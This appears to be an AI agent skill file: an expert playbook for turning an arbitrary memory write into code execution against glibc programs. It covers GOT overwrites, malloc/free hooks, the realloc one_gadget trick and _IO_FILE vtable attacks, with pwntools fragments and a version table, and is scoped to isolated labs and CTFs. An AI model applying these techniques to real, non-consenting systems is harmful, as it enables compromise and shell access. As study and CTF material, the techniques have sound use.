---
name: arbitrary-write-to-rce
description: >-
  Arbitrary write to RCE playbook. Use when you have an arbitrary write primitive (from heap exploitation, format string, or OOB write) and need to convert it into code execution by targeting GOT, hooks, _IO_FILE vtable, exit_funcs, TLS_dtor_list, modprobe_path, .fini_array, or C++ vtables.
---

# SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert techniques for converting an arbitrary write primitive into code execution. Covers every major overwrite target organized by glibc version compatibility: GOT, __malloc_hook, __free_hook, _IO_FILE vtable, __exit_funcs, TLS_dtor_list, _dl_fini, modprobe_path, .fini_array, C++ vtable, and setcontext gadget. This is the "last mile" skill. baseline analyses often target hooks that no longer exist (post-glibc 2.34) or miss pointer mangling requirements.

## 0. RELATED ROUTING

- `heap-exploitation` — obtaining the arbitrary write via heap attacks
- `format-string-exploitation` — obtaining the arbitrary write via %n
- `stack-overflow-and-rop` — stack-based write primitives
- `binary-protection-bypass` — which targets are available given protection configuration
- heap-exploitation IO_FILE_EXPLOITATION.md reference in the canonical `heap-exploitation` Skill — deep _IO_FILE structure exploitation

---

## 1. TARGET SELECTION BY GLIBC VERSION

| Target | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | Required Knowledge |
|---|---|---|---|---|
| GOT overwrite | OK (Partial RELRO) | OK (Partial RELRO) | OK (Partial RELRO) | Binary base |
| `__malloc_hook` | OK | OK | **Removed** | libc base |
| `__free_hook` | OK | OK | **Removed** | libc base |
| `__realloc_hook` | OK | OK | **Removed** | libc base |
| `_IO_FILE` vtable (direct) | OK | Vtable range check | Vtable range check | libc base + heap |
| `_IO_FILE` via `_IO_str_jumps` | N/A | OK (2.24–2.27) | Patched | libc base + heap |
| `_IO_FILE` via `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc base + heap |
| `__exit_funcs` | OK | OK | OK | libc base + pointer guard |
| `TLS_dtor_list` | N/A | N/A | OK | TLS addr + pointer guard |
| `_dl_fini` / link_map | OK | OK | OK | ld.so base |
| `modprobe_path` (kernel) | OK | OK | OK | Kernel base |
| `.fini_array` | OK | OK | OK | Binary base (if writable) |
| C++ vtable | OK | OK | OK | Object address + heap |
| `setcontext` gadget | OK | OK (changed in 2.29) | OK | libc base |
| Stack return address | Always | Always | Always | Stack address |

---

## 2. GOT OVERWRITE

**Replace a function pointer in the Global Offset Table.**

### Requirements
- Partial RELRO (`.got.plt` writable) — Full RELRO blocks this entirely

### Common Targets

| Overwrite From | Overwrite To | Trigger |
|---|---|---|
| `printf@GOT` | `system` | Next `printf(user_input)` with input = `/bin/sh` |
| `free@GOT` | `system` | Next `free(ptr)` where ptr points to `"/bin/sh"` |
| `strlen@GOT` | `system` | Next `strlen(user_input)` |
| `atoi@GOT` | `system` | Next `atoi(user_input)` with input = `"sh"` |
| `puts@GOT` | `system` | Next `puts(user_input)` |
| `exit@GOT` | `main` or gadget | Create loop for multi-shot exploit |
| `__stack_chk_fail@GOT` | `ret` gadget | Neutralize canary check |

```python
# Format string GOT overwrite
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})

# Heap-based GOT overwrite (tcache poisoning)
# Allocate chunk at GOT address → write system address
```

---

## 3. __malloc_hook / __free_hook (glibc < 2.34)

### __malloc_hook

```python
# Overwrite __malloc_hook with one_gadget address
# Triggered by any malloc call (including internal malloc in printf with large format)
write(libc.sym['__malloc_hook'], one_gadget_addr)
# Trigger:
io.sendline('%100000c')  # printf calls malloc internally for large format
```

### __free_hook

```python
# Overwrite __free_hook with system
write(libc.sym['__free_hook'], libc.sym['system'])
# Trigger: free a chunk containing "/bin/sh"
chunk_data = b'/bin/sh\x00'
# ... allocate chunk with this data, then free it
```

### Realloc Trick for one_gadget Constraints

```python
# one_gadget often requires specific register/stack state
# realloc pushes registers and adjusts stack before calling __realloc_hook
# Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
# Set __realloc_hook = one_gadget
write(libc.sym['__realloc_hook'], one_gadget)
write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
```

---

## 4. _IO_FILE VTABLE

See IO_FILE_EXPLOITATION.md reference in the canonical `heap-exploitation` Skill for full details.

### Quick Summary by Version

| glibc | Method | Vtable Target |
|---|---|---|
| < 2.24 | Direct vtable overwrite | Point vtable to fake table with `system` at `__overflow` offset |
| 2.24–2.27 | `_IO_str_jumps` | Within valid range; `_IO_str_finish` calls `_s._free_buffer` |
| ≥ 2.28 | `_IO_wfile_jumps` | Wide-char path: `_wide_data->_wide_vtable` not range-checked |
| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → fake wide vtable call |

### FSOP Trigger

```python
# Overwrite _IO_list_all → fake FILE with crafted vtable
# Trigger via exit() or malloc abort → _IO_flush_all_lockp → _IO_OVERFLOW
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. __exit_funcs / __atexit
- 6. TLS_dtor_list (glibc ≥ 2.34)
- 7. _dl_fini / LINK_MAP CORRUPTION
- 8. modprobe_path (KERNEL)
- 9. .fini_array
- 10. C++ VTABLE OVERWRITE
- 11. setcontext GADGET
- 12. DECISION TREE
